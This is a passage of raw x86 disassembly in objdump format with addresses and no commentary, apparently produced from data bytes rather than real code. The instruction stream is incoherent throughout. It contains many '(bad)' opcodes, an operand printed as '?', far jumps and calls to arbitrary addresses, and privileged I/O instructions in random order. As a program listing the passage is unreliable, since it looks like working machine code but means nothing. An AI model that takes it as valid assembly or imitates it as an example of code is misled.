  4038bb:	and    BYTE PTR [esi],0xc0
  4038be:	repz sub edi,ebx
  4038c1:	fs inc esp
  4038c3:	xor    ah,BYTE PTR [esi-0x14]
  4038c6:	cld    
  4038c7:	mov    DWORD PTR [ebx],ebp
  4038c9:	hlt    
  4038ca:	sbb    eax,0x134ae739
  4038cf:	hlt    
  4038d0:	stos   DWORD PTR es:[edi],eax
  4038d1:	lea    ebx,[edx+0x3f]
  4038d4:	out    0x6b,al
  4038d6:	mov    ebx,0xcd7abe2c
  4038db:	ss scas al,BYTE PTR es:[edi]
  4038dd:	jl     0x40394a
  4038df:	cmp    DWORD PTR [ebx+0x1d],0x5d9892e2
  4038e6:	or     al,0x6d
  4038e8:	jmp    0x9715:0x651bdd26
  4038ef:	adc    esp,ebx
  4038f1:	popf   
  4038f2:	adc    al,0x1e
  4038f4:	lea    eax,[eax*8+0x1f74ce8b]
  4038fb:	test   eax,0x143b126c
  403900:	or     DWORD PTR [edx],ecx
  403902:	ficomp WORD PTR gs:[eax-0x7614306]
  403909:	jg     0x403956
  40390b:	sub    bl,bh
  40390d:	sahf   
  40390e:	aad    0x29
  403910:	xchg   cx,ax
  403912:	mov    cl,0x93
  403914:	xchg   ebx,eax
  403915:	aam    0xb
  403917:	rol    dh,0xed
  40391a:	cmpps  xmm6,XMMWORD PTR [ecx-0x34],0x85
  40391f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403920:	or     DWORD PTR [esi],ebp
  403922:	push   cs
  403923:	rol    DWORD PTR ds:0x8c6ba4bc,cl
  403929:	les    esi,FWORD PTR [edi]
  40392b:	ins    BYTE PTR es:[edi],dx
  40392c:	or     DWORD PTR [edx-0x446ac370],esp
  403932:	pop    ebx
  403933:	adc    DWORD PTR [edx-0x7d],edi
  403936:	mov    DWORD PTR [edx+0x5323a46d],0x67498f54
  403940:	bnd js 0x4038fc
  403943:	adc    al,0x51
  403945:	sub    DWORD PTR [eax+0x49],0x4757d6e2
  40394c:	xlat   BYTE PTR ds:[ebx]
  40394d:	test   eax,0x65f4c8dd
  403952:	fistp  DWORD PTR [ecx-0x5a]
  403955:	lods   eax,DWORD PTR ds:[esi]
  403956:	(bad)  
  403957:	xchg   edx,eax
  403958:	push   0xffffffa3
  40395a:	imul   edx,DWORD PTR [ebp+eiz*1+0x3e],0xb54eee59
  403962:	push   ss
  403963:	(bad)  
  403964:	sbb    DWORD PTR [ebx],esi
  403966:	pop    ds
  403967:	add    eax,0xa8857aea
  40396c:	sbb    eax,0x12af69a1
  403971:	cld    
  403972:	or     eax,0xfa64881f
  403977:	or     esp,ebp
  403979:	push   ds
  40397a:	sub    BYTE PTR [ebp+edx*8+0x5fd670bb],0x6
  403982:	es (bad) 
  403984:	aad    0xbf
  403986:	add    DWORD PTR [ebx-0x6a],esp
  403989:	dec    esi
  40398a:	test   BYTE PTR [esi],dh
  40398c:	adc    al,0x27
  40398e:	pop    edi
  40398f:	fs (bad) 
  403991:	daa    
  403992:	not    DWORD PTR [eax+0x42]
  403995:	xchg   DWORD PTR [edx-0x10eba3e8],edi
  40399b:	pushf  
  40399c:	mov    al,ds:0x67fc9fb1
  4039a1:	pop    edi
  4039a2:	rol    BYTE PTR [esi],0x43
  4039a5:	test   DWORD PTR [edi],edi
  4039a7:	fs mov ebx,0xd69037ff
  4039ad:	ror    DWORD PTR [edi-0x35],0x20
  4039b1:	aas    
  4039b2:	mov    WORD PTR [esp+edi*2],ss
  4039b5:	pushf  
  4039b6:	je     0x403a1e
  4039b8:	jg     0x403967
  4039ba:	retf   
  4039bb:	repnz xchg esp,eax
  4039bd:	jb     0x4039b2
  4039bf:	mov    ah,0x43
  4039c1:	lock addr16 mov bh,0x19
  4039c5:	mov    ds,WORD PTR [esi+eax*8]
  4039c8:	aam    0x6c
  4039ca:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  4039cc:	loopne 0x4039c7
  4039ce:	bnd jg 0x403a4f
  4039d1:	xchg   edi,eax
  4039d2:	mov    bl,0xf5
  4039d4:	and    DWORD PTR [eax+0x28],edx
  4039d7:	inc    ecx
  4039d8:	jns    0x403989
  4039da:	fistp  WORD PTR [esi-0x3fe5d731]
  4039e0:	mov    dh,0x66
  4039e2:	mov    ebx,0x1a18cb9
  4039e7:	mov    cl,BYTE PTR [eax]
  4039e9:	fistp  WORD PTR [edi+eax*8-0x6e]
  4039ed:	retf   
  4039ee:	(bad)  
  4039ef:	loopne 0x4039c0
  4039f1:	call   0xa5ac:0xd4824703
  4039f8:	xor    al,0x17
  4039fa:	leave  
  4039fb:	jae    0x40399b
  4039fd:	xchg   BYTE PTR [ecx+0x64],ch
  403a00:	in     al,dx
  403a01:	mov    eax,0xed7c2ff0
  403a06:	mov    ds:0x758d163,al
  403a0b:	shl    DWORD PTR [edx-0xd47cad2],1
  403a11:	jmp    0xeab88684
  403a16:	cmp    al,0xd3
  403a18:	scas   eax,DWORD PTR es:[edi]
  403a19:	mov    cl,BYTE PTR [ebx-0x30a16941]
  403a1f:	(bad)  
  403a20:	adc    eax,0x20d67f7b
  403a25:	mov    dh,0xdf
  403a27:	jecxz  0x403a5b
  403a29:	or     DWORD PTR [esi-0x32],edi
  403a2c:	dec    esi
  403a2d:	or     al,0xa8
  403a2f:	cmp    BYTE PTR [ebp-0xe],dh
  403a32:	(bad)  
  403a33:	in     al,dx
  403a34:	idiv   BYTE PTR [edx+0x68]
  403a37:	and    esi,DWORD PTR [esi-0x2f1387e7]
  403a3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403a3e:	mov    ds:0xd4cdd769,eax
  403a43:	and    eax,0xa5947ceb
  403a48:	mov    eax,ds:0x6e03b396
  403a4d:	aad    0x39
  403a4f:	xchg   esp,eax
  403a50:	inc    edi
  403a51:	outs   dx,BYTE PTR ds:[esi]
  403a52:	push   ss
  403a53:	cdq    
  403a54:	rcl    BYTE PTR [edi],0xb7
  403a57:	xchg   ebx,eax
  403a58:	push   ebx
  403a59:	jmp    0x403ab2
  403a5b:	not    edi
  403a5d:	loopne 0x403a3a
  403a5f:	xor    bh,BYTE PTR [edx]
  403a61:	and    bh,bh
  403a63:	and    bh,bl
  403a65:	and    eax,0xa401e58a
  403a6a:	aam    0xd1
  403a6c:	fmul   QWORD PTR [esi+0x5c99420d]
  403a72:	dec    edi
  403a73:	call   0x356:0xdb638a98
  403a7a:	pop    ebp
  403a7b:	test   BYTE PTR [edx+eax*1],al
  403a7e:	dec    ebp
  403a7f:	add    al,0x76
  403a81:	lods   al,BYTE PTR ds:[esi]
  403a82:	les    ebx,FWORD PTR [esi-0x5]
  403a85:	ja     0x403ace
  403a87:	inc    ebx
  403a88:	(bad)  
  403a89:	call   0x33a35599
  403a8e:	fwait
  403a8f:	pop    edx
  403a90:	jae    0x403b01
  403a92:	jae    0x403ae3
  403a94:	add    DWORD PTR [ecx-0x7126d260],0xc1a87b39
  403a9e:	sbb    esp,ebp
  403aa0:	xchg   BYTE PTR [edi+0x30],ah
  403aa3:	sub    esi,DWORD PTR [eax-0x6065f239]
  403aa9:	xchg   esp,eax
  403aaa:	push   ebx
  403aab:	jle    0x403af6
  403aad:	mov    eax,ds:0xaa49e4c1
  403ab2:	sub    BYTE PTR [eax],dl
  403ab4:	fwait
  403ab5:	sub    eax,0x4149e9ce
  403aba:	add    BYTE PTR [edx+0x145ae801],al
  403ac0:	push   ebx
  403ac1:	push   cs
  403ac2:	test   bl,0xcd
  403ac5:	dec    esi
  403ac6:	stos   DWORD PTR es:[edi],eax
  403ac7:	mov    ebx,0xc3e4d75d
  403acc:	or     al,0x28
  403ace:	outs   dx,BYTE PTR ds:[esi]
  403acf:	push   ecx
  403ad0:	add    ebx,edx
  403ad2:	cli    
  403ad3:	les    edx,FWORD PTR [esp+edi*1+0x26]
  403ad7:	retf   0x4cac
  403ada:	add    DWORD PTR [ecx-0x6b],eax
  403add:	pop    ds
  403ade:	mov    ecx,0x12fd9f1f
  403ae3:	jno    0x403b5d
  403ae5:	and    dl,BYTE PTR ss:[ecx+ecx*1+0x7fe9e5f7]
  403aed:	push   esp
  403aee:	cwde   
  403aef:	(bad)  
  403af0:	push   0x90365af0
  403af5:	repnz xchg ebx,eax
  403af7:	xchg   ebp,eax
  403af8:	shr    DWORD PTR [eax-0x635a11b9],1
  403afe:	inc    ebp
  403aff:	cmc    
  403b00:	inc    ecx
  403b01:	push   cs
  403b02:	push   ebx
  403b03:	adc    ecx,DWORD PTR [edi]
  403b05:	mov    ebp,0x939559
  403b0a:	push   es
  403b0b:	(bad)  
  403b0c:	fadd   DWORD PTR [ebx+ebx*2-0x2d6dae67]
  403b13:	das    
  403b14:	adc    eax,0xe52a0773
  403b19:	hlt    
  403b1a:	int3   
  403b1b:	cdq    
  403b1c:	push   edi
  403b1d:	dec    edi
  403b1e:	or     al,0xa1
  403b20:	jb     0x403b2f
  403b22:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b23:	outs   dx,BYTE PTR ds:[esi]
  403b24:	sti    
  403b25:	scas   eax,DWORD PTR es:[edi]
  403b26:	pop    ds
  403b27:	xor    eax,0x607cd7d8
  403b2c:	pop    ebx
  403b2d:	sbb    eax,0x2b86d0d1
  403b32:	mov    edx,DWORD PTR [esi]
  403b34:	jl     0x403aed
  403b36:	lock mov cl,0xa9
  403b39:	mov    edx,DWORD PTR [esp+eiz*4+0x6c3d557a]
  403b40:	stos   DWORD PTR es:[edi],eax
  403b41:	xchg   esp,eax
  403b42:	mov    BYTE PTR [edi+0x169aed4c],dl
  403b48:	pusha  
  403b49:	cdq    
  403b4a:	xchg   DWORD PTR [ebp+0x6469cadb],esp
  403b50:	pop    ebp
  403b51:	stos   DWORD PTR es:[edi],eax
  403b52:	jnp    0x403b66
  403b54:	loope  0x403b3d
  403b56:	push   cs
  403b57:	mov    al,0xdb
  403b59:	ds pop ebp
  403b5b:	into   
  403b5c:	fnstsw WORD PTR [ecx+esi*2]
  403b5f:	push   cs
  403b60:	fstp   TBYTE PTR [esi-0x37]
  403b63:	sub    cl,dh
  403b65:	dec    eax
  403b66:	psllq  mm1,mm1
  403b69:	(bad)  
  403b6a:	mov    edx,0x2c30996a
  403b6f:	pop    ecx
  403b70:	mov    esi,DWORD PTR [edi+0x30078750]
  403b76:	add    al,0xc8
  403b78:	inc    esi
  403b79:	shl    BYTE PTR ds:0x145eee54,cl
  403b7f:	adc    DWORD PTR [esp+ebx*2-0x43],edx
  403b83:	jo     0x403b90
  403b85:	sbb    edx,0x5d
  403b88:	and    BYTE PTR [ebx],dl
  403b8a:	jge    0x403b37
  403b8c:	loop   0x403b95
  403b8e:	pop    ds
  403b8f:	or     esi,edx
  403b91:	and    eax,0x787b36
  403b96:	pop    edx
  403b97:	mov    ds,WORD PTR [esi+0x23]
  403b9a:	sbb    ebp,ebx
  403b9c:	push   ss
  403b9d:	jl     0x403b28
  403b9f:	lods   al,BYTE PTR ds:[esi]
  403ba0:	or     BYTE PTR [esi-0x3c],bh
  403ba3:	dec    ebx
  403ba4:	cwde   
  403ba5:	fdivr  DWORD PTR [eax+0x1714df11]
  403bab:	mov    dl,0x8f
  403bad:	add    BYTE PTR [esi-0x4f],0xb5
  403bb1:	ins    BYTE PTR es:[edi],dx
  403bb2:	std    
  403bb3:	jp     0x403bd5
  403bb5:	outs   dx,DWORD PTR ds:[esi]
  403bb6:	out    dx,al
  403bb7:	cmp    DWORD PTR [esi],eax
  403bb9:	out    0xd3,al
  403bbb:	ds pushf 
  403bbd:	mov    dl,0xf5
  403bbf:	sbb    ah,dh
  403bc1:	ret    
  403bc2:	sbb    BYTE PTR [edx+0x4b789681],bl
  403bc8:	mov    DWORD PTR [edx+0x2e],esp
  403bcb:	jmp    0x4b27:0x517180a7
  403bd2:	mov    eax,ds:0x984d71f4
  403bd7:	rcr    DWORD PTR [eax],cl
  403bd9:	popf   
  403bda:	fidivr WORD PTR [edx+0xe792656]
  403be0:	cli    
  403be1:	test   DWORD PTR [edx],eax
  403be3:	push   ds
  403be4:	arpl   ax,dx
  403be6:	and    DWORD PTR [ebp-0x3e1854df],eax
  403bec:	sbb    ebp,ebp
  403bee:	pop    es
  403bef:	shl    DWORD PTR [eax],cl
  403bf1:	ja     0x403c06
  403bf3:	pop    ecx
  403bf4:	retf   0xea91
  403bf7:	dec    esp
  403bf8:	xor    DWORD PTR [eax+eiz*2+0x7b],0x50
  403bfd:	adc    eax,0xc08eddc8
  403c02:	vpaddsw ymm7,ymm6,ymm4
  403c06:	aam    0x82
  403c08:	xchg   ebp,eax
  403c09:	test   eax,0x2b110094
  403c0e:	(bad)  
  403c0f:	mov    DWORD PTR [ebp-0x356ebd68],0xe7e1e5e6
  403c19:	addr16 retf 
  403c1b:	sbb    dh,BYTE PTR [ebx-0x80]
  403c1e:	xor    dl,ch
  403c20:	jmp    0x408d2f70
  403c25:	fwait
  403c26:	and    ebp,DWORD PTR ds:[ebp+0x25c62ecb]
  403c2d:	fs ja  0x403bee
  403c30:	xor    eax,ecx
  403c32:	sub    eax,0xe571e10d
  403c37:	mov    al,ds:0xdc72f88f
  403c3c:	and    al,0x27
  403c3e:	js     0x403c25
  403c40:	fwait
  403c41:	pop    ds
  403c42:	xchg   edi,eax
  403c43:	pop    esp
  403c44:	and    esi,DWORD PTR [esi]
  403c46:	stc    
  403c47:	sbb    ebp,edi
  403c49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c4a:	mov    edx,0x47e15f26
  403c4f:	aas    
  403c50:	mov    cl,0x45
  403c52:	jle    0x403cbb
  403c54:	jge    0x403c2e
  403c56:	out    0xf0,eax
  403c58:	jle    0x403c13
  403c5a:	sti    
  403c5b:	bound  eax,QWORD PTR [ebx+0x1323c913]
  403c61:	mov    ds:0x7aa52afe,eax
  403c66:	div    BYTE PTR [eax-0x8]
  403c69:	shl    BYTE PTR [ebx-0x6],1
  403c6c:	jp     0x403c46
  403c6e:	jl     0x403c9b
  403c70:	pusha  
  403c71:	inc    edi
  403c72:	clc    
  403c73:	jne    0x403c91
  403c75:	jbe    0x403c88
  403c77:	jb     0x403ce4
  403c79:	or     eax,DWORD PTR [esp+edx*1+0x12293df5]
  403c80:	aas    
  403c81:	jno    0x403c83
  403c83:	cmp    eax,0xe9f74b49
  403c88:	push   es
  403c89:	pop    edi
  403c8a:	lock stos BYTE PTR es:[edi],al
  403c8c:	add    ebx,DWORD PTR [edx]
  403c8e:	add    cl,BYTE PTR [esi+0x39]
  403c91:	mov    al,ds:0x72931cb
  403c96:	mov    al,ds:0xe705c9d8
  403c9b:	shl    BYTE PTR [edi+0x23],0x38
  403c9f:	mov    esi,cs
  403ca1:	or     eax,0x1483e624
  403ca6:	xchg   ebx,eax
  403ca7:	aas    
  403ca8:	cmp    al,0xa1
  403caa:	mov    al,0xc5
  403cac:	ja     0x403cd4
  403cae:	or     dl,BYTE PTR es:[esi-0x53]
  403cb2:	mov    ecx,ss
  403cb4:	imul   BYTE PTR [edx+0x648f32a7]
  403cba:	popf   
  403cbb:	add    DWORD PTR ds:[ecx-0x76],0x545cced4
  403cc3:	sub    BYTE PTR [edx-0x1e],ah
  403cc6:	bound  esp,QWORD PTR [esi+0x22]
  403cc9:	fmul   st(4),st
  403ccb:	test   esi,esp
  403ccd:	arpl   WORD PTR [edx],cx
  403ccf:	push   ebp
  403cd0:	jbe    0x403ce3
  403cd2:	adc    DWORD PTR [eax-0x2eaf7925],ebx
  403cd8:	loop   0x403c7d
  403cda:	arpl   WORD PTR cs:[ebp+edi*4-0x1a615273],bx
  403ce2:	sub    BYTE PTR [edi+0x76],al
  403ce5:	std    
  403ce6:	adc    bl,bl
  403ce8:	stos   BYTE PTR es:[edi],al
  403ce9:	daa    
  403cea:	pop    ds
  403ceb:	out    dx,eax
  403cec:	lock dec sp
  403cef:	out    dx,al
  403cf0:	mov    bh,0xd6
  403cf2:	and    eax,0xa38e8154
  403cf7:	adc    edx,DWORD PTR [eax-0x75a1716]
  403cfd:	or     ebx,0xf85fcc1b
  403d03:	lock mov bh,0x49
  403d06:	and    eax,0xf5c013b7
  403d0b:	pop    esp
  403d0c:	fs lahf 
  403d0e:	leave  
  403d0f:	ds (bad) 
  403d11:	in     eax,0x4c
  403d13:	out    0xd6,eax
  403d15:	add    al,0x6a
  403d17:	in     al,0x21
  403d19:	adc    DWORD PTR [edx-0x44d8e655],0xffffff81
  403d20:	sbb    eax,0xd4b47e82
  403d25:	lahf   
  403d26:	add    al,0x53
  403d28:	sbb    al,0x13
  403d2a:	out    0x2,eax
  403d2c:	repz or al,0xc8
  403d2f:	adc    bh,0xf9
  403d32:	(bad)  
  403d33:	mov    bh,dh
  403d35:	daa    
  403d36:	call   0xc2a4b90b
  403d3b:	in     eax,dx
  403d3c:	push   eax
  403d3d:	xor    DWORD PTR [edi-0x62],0xffffffb9
  403d41:	aam    0x33
  403d43:	cs hlt 
  403d45:	aas    
  403d46:	sbb    esp,ebp
  403d48:	cmc    
  403d49:	fsub   DWORD PTR ds:0x8b00ec4c
  403d4f:	dec    edi
  403d50:	ret    0xc8d9
  403d53:	outs   dx,DWORD PTR ds:[esi]
  403d54:	mov    ds:0x87ea58ab,eax
  403d59:	arpl   WORD PTR [ecx-0x5b],sp
  403d5c:	in     al,dx
  403d5d:	dec    ecx
  403d5e:	add    ch,ah
  403d60:	aad    0xf1
  403d62:	in     al,dx
  403d63:	add    cl,al
  403d65:	out    dx,eax
  403d66:	adc    al,0xdf
  403d68:	sahf   
  403d69:	mov    bl,0x49
  403d6b:	jb     0x403db1
  403d6d:	lahf   
  403d6e:	ss jbe 0x403d91
  403d71:	rol    BYTE PTR [edx],1
  403d73:	mov    ah,0xe0
  403d75:	jns    0x403d66
  403d77:	xor    bl,0xf3
  403d7a:	mov    ebp,0x9ffd62e6
  403d7f:	pop    ds
  403d80:	(bad)  
  403d81:	loope  0x403db4
  403d83:	cmp    dl,bh
  403d85:	mov    ecx,0x138be6c4
  403d8a:	xchg   BYTE PTR [eax+0x35698c36],dh
  403d90:	scas   eax,DWORD PTR es:[edi]
  403d91:	or     BYTE PTR [eax-0x51],dh
  403d94:	outs   dx,BYTE PTR ds:[esi]
  403d95:	and    al,0x1f
  403d97:	push   ebx
  403d98:	repnz imul ebp,DWORD PTR [ebx+0x6d051eb2],0x52
  403da0:	repnz inc edx
  403da2:	inc    esi
  403da3:	sbb    DWORD PTR [eax],esi
  403da5:	fwait
  403da6:	jmp    0xdd7064e0
  403dab:	sub    WORD PTR [ecx+0x7047d83],0x54
  403db3:	aas    
  403db4:	pop    ds
  403db5:	mov    ebx,0x830b060f
  403dba:	push   ebx
  403dbb:	test   al,0x4
  403dbe:	jmp    0x5e69:0x3192db8b
  403dc5:	mov    fs,ebx
  403dc7:	xchg   ebp,eax
  403dc8:	mov    ecx,ecx
  403dca:	pushf  
  403dcb:	loopne 0x403d54
  403dcd:	dec    ebp
  403dce:	pop    ds
  403dcf:	xor    eax,0x352f6778
  403dd4:	int3   
  403dd5:	sub    al,0x4f
  403dd7:	adc    BYTE PTR [eax],cl
  403dd9:	xor    DWORD PTR [ebp-0x51372a57],ebx
  403ddf:	ror    DWORD PTR [ecx+0x177ef9de],0x2d
  403de6:	aad    0xe4
  403de8:	sub    DWORD PTR [ebx+0x4b],edi
  403deb:	aam    0x2c
  403ded:	ins    DWORD PTR es:[edi],dx
  403dee:	jp     0x403d8f
  403df0:	mov    WORD PTR [edx-0x5a1c682a],fs
  403df6:	js     0x403e08
  403df8:	mov    eax,0x304bc7e9
  403dfd:	mov    esp,0xfba91fa
  403e02:	sub    DWORD PTR [ebp+0x40e96416],ebx
  403e08:	call   0xc481:0x9344266f
  403e0f:	popa   
  403e10:	shl    DWORD PTR [edi-0x53],0xa1
  403e14:	cs mov esi,0x4a50566a
  403e1a:	retf   0x570a
  403e1d:	inc    esi
  403e1e:	sub    esi,edx
  403e20:	test   DWORD PTR [edi+0x75494951],eax
  403e26:	fsubr  DWORD PTR [ebx+0x1b]
  403e29:	sahf   
  403e2a:	pop    esp
  403e2b:	adc    ebp,DWORD PTR [eax-0x6054e991]
  403e31:	mov    bl,0xa7
  403e33:	xor    ah,ah
  403e35:	xor    esp,DWORD PTR [ecx-0x4e4be529]
  403e3b:	mov    dh,0x7f
  403e3d:	jp     0x403e63
  403e3f:	aaa    
  403e40:	ins    DWORD PTR es:[edi],dx
  403e41:	in     eax,dx
  403e42:	call   0x55908dbd
  403e47:	xchg   ebx,eax
  403e48:	js     0x403e70
  403e4a:	mov    eax,ds:0x5154538f
  403e4f:	aam    0xbe
  403e51:	push   ds
  403e52:	add    BYTE PTR [edi+0x3],dh
  403e55:	push   ds
  403e56:	cld    
  403e57:	xor    al,0xcb
  403e59:	fnstenv [ebx]
  403e5b:	shr    DWORD PTR [edx-0x15f0ae81],1
  403e61:	in     eax,dx
  403e62:	mov    eax,ds:0x8d176b7e
  403e67:	xlat   BYTE PTR ds:[ebx]
  403e68:	ins    BYTE PTR es:[edi],dx
  403e69:	icebp  
  403e6a:	and    edx,DWORD PTR gs:[edx+ebx*4-0x587f2077]
  403e72:	jbe    0x403e07
  403e74:	pop    eax
  403e75:	test   BYTE PTR [edi],dh
  403e77:	push   ss
  403e78:	retf   
  403e79:	sub    bh,BYTE PTR [eax-0x7a79c46f]
  403e7f:	mov    ch,0x70
  403e81:	and    BYTE PTR ds:[eax+0x7e],0x7a
  403e86:	mov    ebx,0xb2d7e04
  403e8b:	ret    0x5744
  403e8e:	call   0x3d3a:0xd49dd0dd
  403e95:	mov    esi,DWORD PTR [eax+0x6cd35258]
  403e9b:	popf   
  403e9c:	jmp    0x29a03a99
  403ea1:	cwde   
  403ea2:	ss stos DWORD PTR es:[edi],eax
  403ea4:	iret   
  403ea5:	ret    0xee6a
  403ea8:	stos   DWORD PTR es:[edi],eax
  403ea9:	lods   al,BYTE PTR ds:[esi]
  403eaa:	out    0x2d,al
  403eac:	sbb    DWORD PTR [ecx+0x2d],edx
  403eaf:	mov    cl,0x40
  403eb1:	sub    BYTE PTR cs:[ebx+edi*2-0x581c1844],dh
  403eb9:	dec    eax
  403eba:	mov    al,BYTE PTR [eax-0x62]
  403ebd:	add    eax,0x9fe28521
  403ec2:	jae    0x403e55
  403ec4:	scas   eax,DWORD PTR es:[edi]
  403ec5:	sub    al,0x49
  403ec7:	mov    al,ds:0x2aba9a6c
  403ecc:	mov    edx,0x509605a9
  403ed1:	iret   
  403ed2:	sbb    BYTE PTR [ebp+0x66a219c0],0x6d
  403ed9:	fidivr DWORD PTR [ebx+0x3b]
  403edc:	and    al,0x80
  403ede:	lods   al,BYTE PTR ds:[esi]
  403edf:	retf   0x3c6
  403ee2:	pop    ebp
  403ee3:	scas   al,BYTE PTR es:[edi]
  403ee4:	dec    edx
  403ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403ee6:	mov    ds:0xd6d706f3,al
  403eeb:	and    dh,BYTE PTR [eax+0x4]
  403eee:	lea    ebx,[ecx+0x22]
  403ef1:	sbb    cl,cl
  403ef3:	shr    BYTE PTR gs:[edx+0x23ea1210],0x98
  403efb:	imul   edx,DWORD PTR [ecx],0xee057ea6
  403f01:	popf   
  403f02:	test   eax,0x73c8e0f1
  403f07:	mov    dl,0x5d
  403f09:	mov    dh,0x9a
  403f0b:	out    dx,al
  403f0c:	loop   0x403ebe
  403f0e:	mov    esp,0xda714e65
  403f13:	dec    ebp
  403f14:	jl     0x403f69
  403f16:	mov    edx,0x8980dddd
  403f1b:	cmp    al,0xbe
  403f1d:	enter  0xa9a1,0xd1
  403f21:	mov    edx,0x7581281d
  403f26:	dec    ebx
  403f27:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403f28:	add    ah,BYTE PTR [eax-0x41]
  403f2b:	add    edx,ebx
  403f2d:	aaa    
  403f2e:	pop    esi
  403f2f:	pushf  
  403f30:	push   esi
  403f31:	push   edi
  403f32:	and    ecx,DWORD PTR [ebx-0x3c]
  403f35:	dec    edx
  403f36:	adc    edi,DWORD PTR [ecx+0x64]
  403f39:	push   ecx
  403f3a:	pop    esi
  403f3b:	into   
  403f3c:	ret    0x2303
  403f3f:	stc    
  403f40:	lea    eax,[eax+0x3e]
  403f43:	sbb    al,0x59
  403f45:	dec    BYTE PTR [ebx-0x777ddf06]
  403f4b:	adc    ebx,DWORD PTR [ecx]
  403f4d:	(bad)  
  403f4e:	lods   eax,DWORD PTR es:[esi]
  403f50:	push   es
  403f51:	jl     0x403eee
  403f53:	push   esp
  403f54:	jb     0x403f7b
  403f56:	imul   ebp,edx,0xffffffc8
  403f59:	data16 int 0xfd
  403f5c:	inc    DWORD PTR ds:0x2eda661
  403f62:	jl     0x403f1f
  403f64:	rcl    BYTE PTR [eax+edi*4-0x27],0x8c
  403f69:	jecxz  0x403f8e
  403f6b:	clc    
  403f6c:	es push ds
  403f6e:	bound  eax,QWORD PTR [ebp+ebx*2+0x43]
  403f72:	jge    0x403fc7
  403f74:	cwde   
  403f75:	adc    ch,bl
  403f77:	scas   al,BYTE PTR es:[edi]
  403f78:	or     al,0xc4
  403f7a:	jle    0x403f33
  403f7c:	xlat   BYTE PTR es:[ebx]
  403f7e:	add    eax,0x4f25d156
  403f83:	dec    ebp
  403f84:	cmp    bh,cl
  403f86:	mov    ah,0x12
  403f88:	popa   
  403f89:	cdq    
  403f8a:	cdq    
  403f8b:	pop    ecx
  403f8c:	repnz out 0xda,al
  403f8f:	jmp    0x403f16
  403f91:	retf   
  403f92:	sub    BYTE PTR [edx-0x360f8910],al
  403f98:	out    0x22,al
  403f9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403f9b:	pop    ss
  403f9c:	cli    
  403f9d:	stos   BYTE PTR es:[edi],al
  403f9e:	sbb    ah,BYTE PTR [edi-0x5d]
  403fa1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403fa2:	lahf   
  403fa3:	mov    dh,0x6b
  403fa5:	(bad)  
  403fa6:	push   edi
  403fa7:	add    eax,0x3cedc150
  403fac:	(bad)  
  403fad:	cmp    eax,0xc4a0a7ef
  403fb2:	fcomp  st(1)
  403fb4:	das    
  403fb5:	xor    dh,dh
  403fb7:	pusha  
  403fb8:	xor    DWORD PTR [ebx-0x3b0b93de],0x3d7b33e9
  403fc2:	cdq    
  403fc3:	rcr    BYTE PTR [esi],1
  403fc5:	jmp    0xca5ff402
  403fca:	aad    0xbe
  403fcc:	pop    edi
  403fcd:	call   0xd18f:0xd66a3af5
  403fd4:	bound  eax,QWORD PTR [eax]
  403fd6:	mov    esi,0x64ac2ab0
  403fdb:	pop    esi
  403fdc:	out    dx,eax
  403fdd:	daa    
  403fde:	and    ebp,DWORD PTR [ecx]
  403fe0:	frstor [edx-0x35]
  403fe3:	add    ah,BYTE PTR [edx+0x72a88c35]
  403fe9:	pop    esi
  403fea:	push   esi
  403feb:	xchg   ecx,eax
  403fec:	dec    esp
  403fed:	push   ecx
  403fee:	in     eax,0x98
  403ff0:	out    0x5c,eax
  403ff2:	jp     0x403ffd
  403ff4:	or     cl,bh
  403ff6:	std    
  403ff7:	ss popf 
  403ff9:	mov    ecx,0x15704725
  403ffe:	xchg   ebx,edx
  404000:	rcl    DWORD PTR [ecx-0x34730112],0xe6
  404007:	mov    ?,WORD PTR [eax+0x6c]
  40400a:	mov    BYTE PTR [ebx+0x4cecaf7a],ch
  404010:	cmp    dl,BYTE PTR [esi-0x47fac0e5]
  404016:	fwait
  404017:	pop    ecx
  404018:	mov    esi,0xf945ecc6
  40401d:	aad    0x64
  40401f:	das    
  404020:	xor    al,BYTE PTR [ecx]
  404022:	mov    dh,0x9b
  404024:	xchg   ecx,eax
  404025:	stc    
  404026:	or     eax,0xb0b02526
  40402b:	pop    ecx
  40402c:	ret    
  40402d:	push   ebp
  40402e:	push   eax
  40402f:	shl    BYTE PTR [ebx+0x14],1
  404032:	xchg   BYTE PTR [ebx],dh
  404034:	mov    bl,0xb2
  404036:	aas    
  404037:	pop    ebx
  404038:	jge    0x404080
  40403a:	imul   esp,edi,0xb8b76fa0
  404040:	mov    gs,WORD PTR [esi-0x17]
  404043:	dec    edx
  404044:	sbb    eax,0xcacf5d50
  404049:	ss adc eax,ebx
  40404c:	xchg   DWORD PTR [esi+esi*4],ebx
  40404f:	cmp    al,0x70
  404051:	inc    ebp
  404052:	aaa    
  404053:	add    DWORD PTR [eax-0x1af7b881],ecx
  404059:	xor    bl,BYTE PTR [esi+ebx*2-0x77d211c9]
  404060:	push   eax
  404061:	dec    ecx
  404062:	cmp    eax,0xc8269dbb
  404067:	or     cl,bh
  404069:	mov    bh,0xe4
  40406b:	es inc ecx
  40406d:	adc    al,0xad
  40406f:	jg     0x40408f
  404071:	jmp    0x67ea6ebb
  404076:	lahf   
  404077:	sub    al,0xf6
  404079:	xor    esp,DWORD PTR ds:0x543a5b66
  40407f:	push   esp
  404080:	add    edx,eax
  404082:	xchg   esi,eax
  404083:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  404085:	jnp    0x40400c
  404087:	cmp    BYTE PTR [edx-0x4112cba7],al
  40408d:	jecxz  0x4040b5
  40408f:	pop    edi
  404090:	add    DWORD PTR [ecx+ecx*2],ecx
  404093:	cdq    
  404094:	push   0x59
  404096:	sbb    eax,0xcbf5caf6
  40409b:	retf   0xb6d5
  40409e:	mov    ebp,0xb933f1e8
  4040a3:	dec    ebx
  4040a4:	in     al,0x10
  4040a6:	jns    0x4040cf
  4040a8:	cwde   
  4040a9:	loopne 0x40411e
  4040ab:	mov    esp,0xd42adbbd
  4040b0:	bound  esi,QWORD PTR [esi]
  4040b2:	mov    ebp,fs
  4040b4:	out    0x57,al
  4040b6:	mov    edx,0x45e5a5a9
